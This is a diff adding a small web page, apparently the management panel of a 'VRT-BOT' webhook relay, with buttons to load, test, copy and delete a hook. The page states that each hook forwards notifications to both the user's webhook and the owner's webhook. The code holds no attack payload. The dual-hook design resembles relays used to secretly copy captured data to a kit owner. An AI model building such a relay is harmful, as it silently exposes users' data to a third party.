@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>VRT-BOT · Hook</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <style>
+        .hook-header {
+            text-align: center;
+            padding: 20px;
+            border-bottom: 1px solid rgba(255,255,255,.06);
+            margin-bottom: 20px;
+        }
+        .hook-header h1 { font-size: 20px; }
+        .hook-header .username { color: #45dc93; font-weight: 600; }
+        .hook-status {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 999px;
+            font-size: 10px;
+            font-weight: 600;
+            text-transform: uppercase;
+            background: rgba(69,220,147,.15);
+            color: #45dc93;
+            border: 1px solid rgba(69,220,147,.2);
+        }
+        .hook-info {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .hook-info .card {
+            padding: 16px;
+            border-radius: 12px;
+            background: rgba(0,0,0,.12);
+            border: 1px solid rgba(255,255,255,.05);
+            text-align: center;
+        }
+        .hook-info .card .label { font-size: 10px; color: #969aa5; text-transform: uppercase; }
+        .hook-info .card .value { font-size: 16px; font-weight: 600; margin-top: 4px; }
+        .hook-actions {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin: 20px 0;
+        }
+        .hook-actions button {
+            padding: 12px 24px;
+            border: 0;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 13px;
+            transition: .2s;
+        }
+        .hook-actions .primary { background: linear-gradient(135deg,#5271ff,#354ee8); color: #fff; }
+        .hook-actions .primary:hover { transform: scale(1.03); box-shadow: 0 8px 25px rgba(82,113,255,.3); }
+        .hook-actions .secondary { background: rgba(255,255,255,.06); color: #969aa5; border: 1px solid rgba(255,255,255,.08); }
+        .hook-actions .secondary:hover { background: rgba(255,255,255,.12); color: #fff; }
+        .hook-actions .danger { background: rgba(255,107,107,.15); color: #ff6b6b; border: 1px solid rgba(255,107,107,.2); }
+        .hook-actions .danger:hover { background: rgba(255,107,107,.25); }
+        @media(max-width:600px) { .hook-info { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="navbar"><div class="logo"><span class="emoji-grey">⚡</span> VRT-BOT · VOLTS</div></header>
+
+        <div class="hook-header">
+            <h1>🔗 <span class="username" id="hookUsername">Loading...</span>'s Hook</h1>
+            <p style="color:#969aa5;font-size:13px;margin-top:4px;">
+                Status: <span class="hook-status" id="hookStatus">Active</span>
+            </p>
+        </div>
+
+        <div class="hook-info">
+            <div class="card">
+                <div class="label">🔗 Hook ID</div>
+                <div class="value" id="hookId">---</div>
+            </div>
+            <div class="card">
+                <div class="label">📅 Created</div>
+                <div class="value" id="hookCreated">---</div>
+            </div>
+        </div>
+
+        <div class="hook-actions">
+            <button class="primary" onclick="testHook()">🧪 Test Hook</button>
+            <button class="secondary" onclick="copyHookUrl()">📋 Copy URL</button>
+            <button class="danger" onclick="deleteHook()">🗑️ Delete Hook</button>
+        </div>
+
+        <div style="text-align:center;padding:20px;">
+            <p style="color:#969aa5;font-size:12px;">
+                This hook sends notifications to BOTH your webhook AND the owner's webhook.
+            </p>
+            <p style="color:#555;font-size:11px;margin-top:8px;">
+                Powered by <span style="color:#5271ff;">VRT-BOT</span> · Dual Hook System
+            </p>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = 'https://vrtxduel.onrender.com';
+        let currentHookId = '';
+
+        // Get hook ID from URL path
+        function getHookId() {
+            const path = window.location.pathname;
+            const parts = path.split('/');
+            return parts[parts.length - 1] || '';
+        }
+
+        async function loadHook() {
+            const id = getHookId();
+            if (!id) {
+                document.getElementById('hookUsername').textContent = 'Invalid';
+                document.getElementById('hookUsername').style.color = '#ff6b6b';
+                return;
+            }
+            currentHookId = id;
+
+            try {
+                const response = await fetch(`${API_BASE}/api/hook/${id}`);
+                const data = await response.json();
+
+                if (response.status === 404) {
+                    document.getElementById('hookUsername').textContent = 'Not Found';
+                    document.getElementById('hookUsername').style.color = '#ff6b6b';
+                    document.getElementById('hookStatus').textContent = '❌ Not Found';
+                    document.getElementById('hookStatus').className = 'hook-status';
+                    document.getElementById('hookStatus').style.background = 'rgba(255,107,107,.15)';
+                    document.getElementById('hookStatus').style.color = '#ff6b6b';
+                    document.getElementById('hookStatus').style.borderColor = 'rgba(255,107,107,.2)';
+                    return;
+                }
+
+                document.getElementById('hookUsername').textContent = data.username;
+                document.getElementById('hookUsername').style.color = '#45dc93';
+                document.getElementById('hookId').textContent = data.id;
+                document.getElementById('hookCreated').textContent = new Date(data.createdAt).toLocaleDateString();
+                document.getElementById('hookStatus').textContent = data.webhookConfigured ? '✅ Active' : '⚠️ No Webhook';
+                document.getElementById('hookStatus').className = 'hook-status';
+                if (!data.webhookConfigured) {
+                    document.getElementById('hookStatus').style.background = 'rgba(255,215,0,.15)';
+                    document.getElementById('hookStatus').style.color = '#ffd700';
+                    document.getElementById('hookStatus').style.borderColor = 'rgba(255,215,0,.2)';
+                }
+
+            } catch (error) {
+                console.error('Error loading hook:', error);
+                document.getElementById('hookUsername').textContent = 'Error';
+                document.getElementById('hookUsername').style.color = '#ff6b6b';
+            }
+        }
+
+        async function testHook() {
+            if (!currentHookId) {
+                alert('No hook ID found');
+                return;
+            }
+
+            const testData = {
+                username: "🧪 VRT-Bot Test",
+                embeds: [{
+                    title: "🧪 Hook Test",
+                    description: `Testing hook: ${currentHookId}`,
+                    color: 0x45dc93,
+                    fields: [
+                        { name: "Hook ID", value: `\`${currentHookId}\``, inline: true },
+                        { name: "Status", value: "✅ Test successful", inline: true },
+                        { name: "Timestamp", value: new Date().toISOString(), inline: true }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: { text: "🧪 Dual Hook Test" }
+                }]
+            };
+
+            try {
+                const response = await fetch(`${API_BASE}/api/send/${currentHookId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ data: testData })
+                });
+                const result = await response.json();
+                
+                if (result.success) {
+                    alert('✅ Test message sent to both hooks!');
+                } else {
+                    alert('⚠️ Test completed with errors: ' + (result.errors || ['Unknown']).join(', '));
+                }
+            } catch (error) {
+                alert('Error: ' + error.message);
+            }
+        }
+
+        function copyHookUrl() {
+            const url = window.location.href;
+            navigator.clipboard.writeText(url).then(() => {
+                alert('✅ URL copied to clipboard!');
+            }).catch(() => {
+                const textarea = document.createElement('textarea');
+                textarea.value = url;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                alert('✅ URL copied to clipboard!');
+            });
+        }
+
+        async function deleteHook() {
+            if (!currentHookId) {
+                alert('No hook ID found');
+                return;
+            }
+            if (!confirm(`Are you sure you want to delete this hook? This cannot be undone.`)) {
+                return;
+            }
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/hook/${currentHookId}`, {
+                    method: 'DELETE'
+                });
+                const data = await response.json();
+                if (data.success) {
+                    alert('✅ Hook deleted successfully');
+                    window.location.href = '/';
+                } else {
+                    alert('Error: ' + (data.error || 'Unknown error'));
+                }
+            } catch (error) {
+                alert('Error: ' + error.message);
+            }
+        }
+
+        // Load hook on page load
+        loadHook();
+    </script>
+</body>
+</html>
